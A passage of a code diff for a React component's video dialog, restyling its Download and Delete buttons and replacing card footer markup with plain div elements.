-                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 shadow-[0_0_10px_hsl(var(--neon-green)/0.3)]"
+                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 text-xs"
                 >
                   <Download className="w-3 h-3 mr-1" /> Download
                 </Button>
                 <Button
-                  onClick={() => {
-                    deleteVideo(viewingVideo.id, viewingVideo.video_url);
-                    setViewingVideo(null);
-                  }}
+                  onClick={() => { deleteVideo(viewingVideo.id, viewingVideo.video_url); setViewingVideo(null); }}
                   size="sm"
                   variant="outline"
-                  className="flex-1 border-neon-red text-neon-red hover:bg-neon-red/10 shadow-[0_0_10px_hsl(var(--neon-red)/0.2)]"
+                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs"
                 >
                   <Trash2 className="w-3 h-3 mr-1" /> Delete
                 </Button>
-              </CardFooter>
-            </Card>
+              </div>
+            </div>
           )}
         </DialogContent>
       </Dialog>
